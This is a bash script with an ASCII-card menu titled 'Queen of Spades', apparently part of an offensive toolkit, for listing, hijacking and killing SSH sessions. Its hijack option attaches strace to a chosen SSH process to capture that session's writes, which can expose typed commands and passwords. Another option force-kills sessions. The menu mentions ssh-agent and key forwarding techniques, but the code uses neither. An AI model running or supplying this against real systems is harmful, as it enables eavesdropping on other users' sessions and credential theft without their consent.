#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'

# Menu for the Queen of Spades Card
queen_of_spades_menu() {
    clear
    echo -e "${CYAN}"
    echo "      __________________________________________________________________________"
    echo "     |                              Queen of Spades                             |"
    echo "     |                       Hijack and Manage SSH Sessions                     |"
    echo "     |__________________________________________________________________________|"
    echo "     |                                                                          |"
    echo "     |  This card allows you to inspect, hijack, or manage SSH sessions using   |"
    echo "     |  ssh-agent and key forwarding techniques.                                |"
    echo "     |                                                                          |"
    echo "     |                                                                          |"
    echo "     |  1. List Active SSH Sessions                                             |"
    echo "     |  2. Hijack SSH Session                                                   |"
    echo "     |  3. Terminate SSH Session                                                |"
    echo "     |  4. Exit                                                                 |"
    echo "     |__________________________________________________________________________|"
    echo -e "${RESET}"
    read -p "Enter your choice: " choice
    case $choice in
        1) list_sessions ;;
        2) hijack_session ;;
        3) terminate_session ;;
        4) exit 0 ;;
        *) echo "Invalid choice. Try again."; sleep 1; queen_of_spades_menu ;;
    esac
}

# List active SSH sessions
list_sessions() {
    clear
    echo -e "${CYAN}Listing active SSH sessions...${RESET}"
    if command -v ps &>/dev/null; then
        ps -aux | grep '[s]sh'
    else
        echo -e "${CYAN}Error: Unable to locate active SSH sessions.${RESET}"
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    queen_of_spades_menu
}

# Hijack an SSH session
hijack_session() {
    clear
    echo -e "${CYAN}Hijacking an SSH session...${RESET}"
    read -p "Enter the PID of the target SSH session: " target_pid

    if [ -d "/proc/$target_pid" ]; then
        echo -e "${CYAN}Attaching to PID $target_pid...${RESET}"
        strace -p "$target_pid" -e trace=write
    else
        echo -e "${CYAN}Error: Invalid PID. Make sure the PID is correct.${RESET}"
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    queen_of_spades_menu
}

# Terminate an SSH session
terminate_session() {
    clear
    echo -e "${CYAN}Terminating an SSH session...${RESET}"
    read -p "Enter the PID of the SSH session to terminate: " target_pid

    if kill -9 "$target_pid" &>/dev/null; then
        echo -e "${CYAN}Session with PID $target_pid terminated.${RESET}"
    else
        echo -e "${CYAN}Error: Unable to terminate session. Check the PID.${RESET}"
    fi
    read -n 1 -s -r -p "Press any key to return to the menu..."
    queen_of_spades_menu
}

queen_of_spades_menu
